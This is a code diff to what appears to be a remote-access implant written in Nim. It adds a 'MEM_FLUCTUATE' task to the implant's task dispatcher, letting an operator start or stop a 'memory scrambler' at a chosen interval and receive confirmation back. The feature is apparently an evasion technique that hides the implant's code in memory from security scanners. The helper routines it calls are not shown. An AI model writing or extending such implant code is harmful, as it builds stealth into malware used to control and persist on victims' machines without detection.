@@ -2151,5 +2151,17 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     else:
       t.sendResult(id, "", "BOF: not supported on this platform")
 
+  of "MEM_FLUCTUATE":
+    let parts = args.strip().splitWhitespace()
+    if parts.len == 0 or parts[0].toLowerAscii() == "stop":
+      stopMemFluctuate()
+      t.sendResult(id, "[+] memory scrambler stopped", "")
+    else:
+      var intervalSec = 10
+      if parts.len >= 2:
+        try: intervalSec = parseInt(parts[1]) except: discard
+      startMemFluctuate(intervalSec)
+      t.sendResult(id, "[+] memory scrambler started (interval " & $intervalSec & "s)", "")
+
   else:
     t.sendResult(id, "", "unknown task type: " & typ)
